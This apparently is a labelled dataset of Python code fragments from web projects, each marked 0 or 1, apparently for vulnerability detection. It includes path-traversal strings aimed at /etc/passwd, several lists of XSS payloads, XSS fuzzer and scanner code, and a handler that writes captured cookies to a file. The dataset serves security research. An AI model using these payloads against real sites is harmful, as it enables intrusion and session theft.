--fasttest is not", "label": 0}, {"snippet_id": 27724, "code": "(values)) self.response.set_status(status) def before_render_json(self, values, status): \"\"\"A hook for modifying values before render_json.\"\"\" def render_json(self, values, status=200): \"\"\"Write JSON response", "label": 0}, {"snippet_id": 20587, "code": " django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG", "label": 0}, {"snippet_id": 27915, "code": " webapp2.RequestHandler.redirect strongly requires 'str' but url might be an unicode string.\"\"\" super(Handler, self).redirect(str(url), **kwargs) class GcsUploadHandler(Handler): \"\"\"A handler which uploads", "label": 1}, {"snippet_id": 12506, "code": "', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id", "label": 0}, {"snippet_id": 37733, "code": " \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +", "label": 0}, {"snippet_id": 8290, "code": ".provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings", "label": 0}, {"snippet_id": 47264, "code": ") delete_view_url=url_for('recordmetadata.delete_view') detail_view_url=url_for( 'recordmetadata.details_view', id=rec_uuid) with app.test_client() as client: res=client.get(index_view_url) assert res.status_code", "label": 0}, {"snippet_id": 26106, "code": ".fields['company'].widget.is_required=True self.fields['company'].widget.attrs['required']='required' del self.fields['company'].widget.attrs['data-display-dependency'] if 'vat_id' in self.fields: del self", "label": 0}, {"snippet_id": 27200, "code": "]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I) if m_action or m_same: has_form=1 form_counter+=1 if m_same: page=\"\" else: page=m_action.group(1) rtype=\"get\" if m_reqtype: rtype=m_reqtype.group(1) print \"[", "label": 1}, {"snippet_id": 21306, "code": "'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+", "label": 1}, {"snippet_id": 16818, "code": "+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name", "label": 1}, {"snippet_id": 39601, "code": " _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:", "label": 0}, {"snippet_id": 38197, "code": " `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def", "label": 0}, {"snippet_id": 13679, "code": "+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses", "label": 1}, {"snippet_id": 26582, "code": "/../../../etc/passwd%00', '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 35035, "code": ".DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False", "label": 0}, {"snippet_id": 43298, "code": " db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe", "label": 0}, {"snippet_id": 36399, "code": "(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc", "label": 0}, {"snippet_id": 27305, "code": " from builtins import object from future import standard_library standard_library.install_aliases() import base64 import cgi import datetime import json import logging import os import re import sys import", "label": 0}, {"snippet_id": 13153, "code": "'create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration',", "label": 0}, {"snippet_id": 40460, "code": " in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or ", "label": 0}, {"snippet_id": 18577, "code": "'open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 45447, "code": "}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator", "label": 0}, {"snippet_id": 6058, "code": " None, 'server_key': None, 'cert_chain': None, 'userdb_mongo_uri': None, 'userdb_mongo_database': None, 'sso_session_lifetime': '15', 'sso_session_mongo_uri': None, 'raven_dsn': None, 'content_packages", "label": 0}, {"snippet_id": 1327, "code": " print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']=", "label": 0}, {"snippet_id": 8921, "code": "'^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 15204, "code": " for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run", "label": 0}, {"snippet_id": 54913, "code": ".actions import ACTIONS_FN_MAP log=logging.getLogger(__name__) def update_stats(translated_resources, locale): \"\"\"Update stats on a list of TranslatedResource. \"\"\" projects=set() for translated_resource", "label": 0}, {"snippet_id": 4931, "code": "'<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '", "label": 0}, {"snippet_id": 41083, "code": "=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context", "label": 0}, {"snippet_id": 44034, "code": " elasticsearch_dsl.query import SimpleQueryString, Bool class RTDFacetedSearch(FacetedSearch): \"\"\"Overwrite the initialization in order too meet our needs\"\"\" def __init__(self, using, index, doc_types,", "label": 1}, {"snippet_id": 17226, "code": "+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 51161, "code": " Meta: ordering=[\"-name\"] class IECrontabSchedule(ImportExportModelAdmin): pass admin.site.unregister(PeriodicTask) admin.site.unregister(CrontabSchedule) admin.site.register(PeriodicTask, IEPeriodicTaskAdmin", "label": 0}, {"snippet_id": 6415, "code": " certificate filename(None==SSL disabled) \"\"\" return self.config.get(self.section, 'server_cert') @property def server_key(self): \"\"\" SSL private key filename(None==SSL disabled) \"\"\" return self.config", "label": 0}, {"snippet_id": 34491, "code": "\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')", "label": 0}, {"snippet_id": 4629, "code": "'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section", "label": 0}, {"snippet_id": 21344, "code": "+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook", "label": 1}, {"snippet_id": 4335, "code": "\n from saker.fuzzers.fuzzer import Fuzzer class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def", "label": 1}, {"snippet_id": 23888, "code": "): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command", "label": 1}, {"snippet_id": 46440, "code": " layout }) dashboard_doc1=dashboard_doc.doc.get() dashboard_doc.name=dashboard_doc1.name=collection['label'] dashboard_doc.description=dashboard_doc1.description=collection['description'] dashboard_doc", "label": 0}, {"snippet_id": 54301, "code": " timeout=ttk.Combobox(main, values=range(1,61)) timeout.current(14) global user_agent user_agent=ttk.Combobox(main, values=ua) user_agent.current(1) global payload payload=ttk.Combobox(main, values=pl)", "label": 0}, {"snippet_id": 37291, "code": " not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"", "label": 0}, {"snippet_id": 35692, "code": ": \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError)", "label": 0}, {"snippet_id": 9825, "code": "'ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', ", "label": 0}, {"snippet_id": 23576, "code": "(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service", "label": 0}, {"snippet_id": 10684, "code": " environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to", "label": 0}, {"snippet_id": 50309, "code": " self.last_alive[csessid]=(time.time(), False) if not self.keep_alive: self.keep_alive=LoopingCall(self._keepalive) self.keep_alive.start(_KEEPALIVE, now=False) return jsonify({'msg': host_string, 'csessid", "label": 0}, {"snippet_id": 5043, "code": "<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus>', '<video><source onerror=\"alert(1)\">', '<video onerror=\"alert(1)\"><source></source></video", "label": 0}, {"snippet_id": 9628, "code": "<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab", "label": 0}, {"snippet_id": 29961, "code": "'<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">Ssh key was save into: %s </div>' % ssh_keys) \ttry: \t\tfunct", "label": 0}, {"snippet_id": 53806, "code": " parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str(result) +\"'\" +\"<marquee style='background:red'>\" +x", "label": 1}, {"snippet_id": 34482, "code": " self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self", "label": 0}, {"snippet_id": 10689, "code": " files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this", "label": 0}, {"snippet_id": 49251, "code": "}) class SmartColumn(TitleFromModelFieldMixin, object): def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None): self.model=model self.field_name", "label": 0}, {"snippet_id": 24932, "code": "-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir:", "label": 0}, {"snippet_id": 30354, "code": ".exceptions.HTTPError as errh: \t\tprint(\"Http Error:\",errh) \texcept requests.exceptions.ConnectionError as errc: \t\tprint('<div class=\"alert alert-danger\">Error Connecting: %s</div>' % errc) \texcept requests", "label": 0}, {"snippet_id": 7966, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]", "label": 0}, {"snippet_id": 46882, "code": " @property async def user(self): return await GithubUser.get(gid=self.github_id) @property async def n_likes(self): return(await self.stats).love_count class CommentMixin: async def add_comment(self, user_id,", "label": 0}, {"snippet_id": 12761, "code": "(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 40945, "code": " import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t", "label": 1}, {"snippet_id": 347, "code": ".logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url", "label": 1}, {"snippet_id": 4862, "code": "('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf", "label": 1}, {"snippet_id": 4720, "code": "'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmessage', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', ", "label": 0}, {"snippet_id": 44870, "code": " @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try: workflow=Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) response['status']=0 response[", "label": 0}, {"snippet_id": 52411, "code": " workflow}) workflow_doc.update_data({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response['id']=workflow_doc", "label": 0}, {"snippet_id": 53999, "code": "=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n[+] ','green')+'New Cookie..\\n\\n'", "label": 0}, {"snippet_id": 40420, "code": "\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision", "label": 0}, {"snippet_id": 4831, "code": " '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\"", "label": 0}, {"snippet_id": 3873, "code": " parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1", "label": 0}, {"snippet_id": 45482, "code": "{'wf_application_path': request.fs.get_hdfs_path(wf_dir)} properties.update(mapping) submission=Submission(request.user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run", "label": 0}, {"snippet_id": 4271, "code": " xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT'", "label": 0}, {"snippet_id": 28245, "code": "\taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import config file\" \t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] !=None", "label": 0}, {"snippet_id": 7553, "code": " 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 2211, "code": "-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert", "label": 0}, {"snippet_id": 23206, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$", "label": 0}, {"snippet_id": 17258, "code": " settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/',", "label": 0}, {"snippet_id": 45688, "code": " bundle_doc.dependencies=dependencies bundle_doc.update_data(bundle_data) bundle_doc.name=bundle_data['name'] bundle_doc.save() response['status']=0 response['id']=bundle_doc.id response['message']=_('Saved ", "label": 0}, {"snippet_id": 18555, "code": ">[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems", "label": 0}, {"snippet_id": 18752, "code": "[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 25193, "code": ".settings import PERSON_NAME_SCHEMES from pretix.base.templatetags.rich_text import rich_text from pretix.control.forms import SplitDateTimeField from pretix.helpers.i18n import get_format_without_seconds", "label": 0}, {"snippet_id": 32763, "code": "(data.splitlines(), start=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line\">' '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" ' 'onclick=\"window.location", "label": 0}, {"snippet_id": 29950, "code": ") as conf: \t\t\tconf.write(form.getvalue('ssh_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class", "label": 0}, {"snippet_id": 19315, "code": " suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('',", "label": 0}, {"snippet_id": 16490, "code": " wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'", "label": 0}, {"snippet_id": 17546, "code": ".hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view", "label": 0}, {"snippet_id": 1264, "code": "(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data", "label": 0}, {"snippet_id": 36991, "code": "=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters", "label": 0}, {"snippet_id": 7026, "code": "<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),", "label": 0}, {"snippet_id": 20857, "code": ": 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$',", "label": 0}, {"snippet_id": 17052, "code": "'open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views", "label": 0}, {"snippet_id": 5750, "code": " form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus", "label": 0}, {"snippet_id": 38730, "code": ", filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in", "label": 0}, {"snippet_id": 4603, "code": "', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter',", "label": 0}, {"snippet_id": 15766, "code": "(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'", "label": 0}, {"snippet_id": 36130, "code": " \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname", "label": 0}, {"snippet_id": 19123, "code": "(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and", "label": 1}, {"snippet_id": 53225, "code": "]) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_coordinator", "label": 0}, {"snippet_id": 31961, "code": " \tserver=sql.get_setting('ldap_server') \tport=sql.get_setting('ldap_port') \tuser=sql.get_setting('ldap_user') \tpassword=sql.get_setting('ldap_password') \tldap_base=sql.get_setting('ldap_base') \tdomain=sql", "label": 0}, {"snippet_id": 43095, "code": "\t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get", "label": 0}, {"snippet_id": 37561, "code": ".as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from", "label": 0}, {"snippet_id": 11385, "code": " msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize", "label": 0}, {"snippet_id": 35561, "code": ".flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split", "label": 0}, {"snippet_id": 50508, "code": "] sess.sessionhandler.disconnect(sess) except IndexError: self.client_disconnect(csessid) return '\"\"' def render_POST(self, request): \"\"\" This function is what Twisted calls with POST requests coming in", "label": 0}, {"snippet_id": 16339, "code": "<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not", "label": 0}, {"snippet_id": 53372, "code": ".objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json': json.dumps(coordinators), 'doc1_id", "label": 1}, {"snippet_id": 8185, "code": ".views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url", "label": 0}, {"snippet_id": 54797, "code": ".user a.save() return super().form_valid(form) class ArticleUpdateView(UserPassesTestMixin, UpdateView): \"\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article success_url='/' fields=['content', 'category'] template_name", "label": 0}, {"snippet_id": 15920, "code": ".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir", "label": 0}, {"snippet_id": 39792, "code": "\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t", "label": 0}, {"snippet_id": 25528, "code": " return value class BaseQuestionsForm(forms.Form): \"\"\" This form class is responsible for asking order-related questions. This includes the attendee name for admission tickets, if the corresponding setting", "label": 0}, {"snippet_id": 52416, "code": "'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response['id']=workflow_doc.id response['doc1_id']=workflow_doc", "label": 0}, {"snippet_id": 33970, "code": "(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment", "label": 0}, {"snippet_id": 37303, "code": " count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not", "label": 0}, {"snippet_id": 22594, "code": " 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/", "label": 0}, {"snippet_id": 53692, "code": " import Environment, FileSystemLoader def make_eb_config(application_name, default_region): UTILS_DIR=os.path.dirname(os.path.abspath(__file__)) j2_env=Environment(loader=FileSystemLoader(UTILS_DIR)) return", "label": 1}, {"snippet_id": 21796, "code": "'ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'", "label": 0}, {"snippet_id": 25473, "code": ".CharField(**defaults) field.part_name=fname fields.append(field) super().__init__( fields=fields, require_all_fields=False, *args, **kwargs ) self.require_all_fields=require_all_fields self.required=self", "label": 0}, {"snippet_id": 